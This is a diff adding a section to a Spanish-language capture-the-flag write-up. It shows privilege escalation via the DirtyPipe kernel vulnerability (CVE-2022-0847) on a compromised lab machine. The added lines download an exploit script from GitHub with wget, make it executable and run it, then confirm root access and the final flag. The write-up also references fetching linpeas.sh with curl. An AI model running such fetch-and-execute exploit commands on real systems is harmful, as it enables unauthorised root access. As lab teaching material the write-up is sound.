@@ -122,5 +122,29 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 
 Este script nos dara mucha informacion util pero nos centraremos en los exploits abiertos o sin corregir que tiene la maquina
 
+![img_27.png](img_27.png)
+![img_28.png](img_28.png)
+
+De todos ellos encontre repositorios directos que nos permiten explotar el siguiente
+[CVE-2022–0847] DirtyPipe
+
+Para ejecutarlo haremos lo siguiente en la consola de la maquina hakeada
+````
+cd /var/www/html
+wget https://raw.githubusercontent.com/r1is/CVE-2022-0847/main/Dirty-Pipe.sh
+chmod +x Dirty-Pipe.sh
+bash Dirty-Pipe.sh
+````
+![img_30.png](img_30.png)
+
+Verificamos entrando en /root
+
+![img_31.png](img_31.png)
+
+y obtenemos la segunda y ultima flag
+
+![img_32.png](img_32.png)
+
+
 
 
